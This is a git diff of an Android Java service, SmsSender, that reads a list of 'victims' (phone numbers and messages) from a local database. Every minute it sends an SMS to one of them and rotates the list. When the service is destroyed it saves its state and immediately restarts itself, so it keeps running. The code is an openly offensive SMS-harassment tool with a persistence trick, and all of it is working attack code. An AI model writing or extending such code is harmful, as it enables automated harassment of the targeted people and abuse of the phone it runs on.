@@ -10,8 +10,12 @@ import android.support.annotation.Nullable;
 import android.telephony.SmsManager;
 import android.util.Log;
 
+import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.LinkedHashMap;
+import java.util.List;
 import java.util.Map;
+import java.util.Set;
 
 /**
  * Created by hackintosh on 4/1/17.
@@ -20,9 +24,11 @@ import java.util.Map;
 public class SmsSender extends Service {
     SmsManager smsManager;
     Intent sendSMSIntent;
-    HashMap<String, String> victims = new HashMap<String,String>();
+    List<String[]> victims; //= new HashMap<String,String>();
     private int time;
     private CountDownTimer timer;
+    private DataBase dataBase;
+    private int flag; //if 1 messages are send, else nothing
 
     @Override
     public void onCreate() {
@@ -34,8 +40,18 @@ public class SmsSender extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d("Service", "start");
+        dataBase = new DataBase(getApplicationContext());
+        dataBase.showTable(DataBaseHelper.ReceiverModel.TABLE_NAME,
+                DataBaseHelper.ReceiverModel.NUMBER,
+                DataBaseHelper.ReceiverModel.MESSAGE);
         sendSMSIntent = intent;
-        victims = (HashMap<String, String>) intent.getSerializableExtra("victims");
+        //victims = (HashMap<String, String>) intent.getSerializableExtra("victims");
+        victims = dataBase.getTable(DataBaseHelper.ReceiverModel.TABLE_NAME);
+        flag = Integer.parseInt(dataBase.getFlag());
+        time = 60000;
+        for(String[] victim : victims) {
+            Log.d("Victims",victim[0] + " " + victim[1]);
+        }
         sendMessagePeriodically();
         return START_REDELIVER_INTENT;
     }
@@ -44,6 +60,10 @@ public class SmsSender extends Service {
     public void onDestroy() {
         // STOP YOUR TASKS
         Log.d("Service", "Stop and Destroy");
+        shuflleVictims();
+        dataBase.populateDB(victims);
+        if(flag > 0) { flag = 0; }
+        dataBase.populateFlagTable("" + flag);
         stopSelf();
         restartService();
     }
@@ -78,9 +98,10 @@ public class SmsSender extends Service {
                 time = 60000;
                 sendMessagePeriodically();
                 Log.d("Time","" + time);
-                for (String victimNumber : victims.keySet()) {
-                    Log.d("Send SMS to " + victimNumber, "Message:" + victims.get(victimNumber));
-                    sendSms(victimNumber,victims.get(victimNumber));
+                Log.d("Flag","" + flag);
+                if(flag > 0) {
+                    Log.d("Send SMS to " + victims.get(0)[0], "Message:" + victims.get(0)[1]);
+                    sendSms(victims.get(0)[0], victims.get(0)[1]);
                 }
             }
         }.start();
@@ -92,5 +113,20 @@ public class SmsSender extends Service {
 
     public void restartService() {
         startService(sendSMSIntent);
+    }
+
+    public void shuflleVictims() {
+        String[] temp = null;
+        for(int i = 0; i < victims.size(); i++) {
+            if(i == 0) {
+                temp = victims.get(i);
+            }
+            if(i == victims.size() - 1) {
+                victims.set(i,temp);
+            }
+            else {
+                victims.set(i,victims.get(i + 1));
+            }
+        }
     }
 }
